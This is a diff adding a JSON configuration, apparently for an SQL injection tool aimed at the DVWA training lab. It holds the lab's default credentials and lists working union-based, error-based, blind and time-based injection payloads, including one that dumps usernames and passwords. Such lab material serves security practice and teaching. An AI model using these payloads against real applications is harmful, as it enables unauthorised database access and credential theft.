@@ -1,0 +1,46 @@
+{
+    "target": {
+        "host": "dvwa.local",
+        "port": 80,
+        "protocol": "http",
+        "base_url": "/vulnerabilities/sqli/",
+        "login_url": "/login.php"
+    },
+    "credentials": {
+        "username": "admin",
+        "password": "password"
+    },
+    "attack": {
+        "delay_between_requests": 0.5,
+        "timeout": 10,
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "security_level": "low"
+    },
+    "payloads": {
+        "union_based": [
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' #",
+            "1' ORDER BY 1--",
+            "1' ORDER BY 2--",
+            "1' UNION SELECT 1,2--",
+            "1' UNION SELECT user(),database()--",
+            "1' UNION SELECT table_name,2 FROM information_schema.tables--",
+            "1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--",
+            "1' UNION SELECT user,password FROM users--"
+        ],
+        "error_based": [
+            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--"
+        ],
+        "blind_boolean": [
+            "' AND 1=1--",
+            "' AND 1=2--",
+            "' AND SUBSTRING(database(),1,1)='d'--"
+        ],
+        "time_based": [
+            "' AND SLEEP(5)--",
+            "'; WAITFOR DELAY '0:0:5'--"
+        ]
+    }
+}
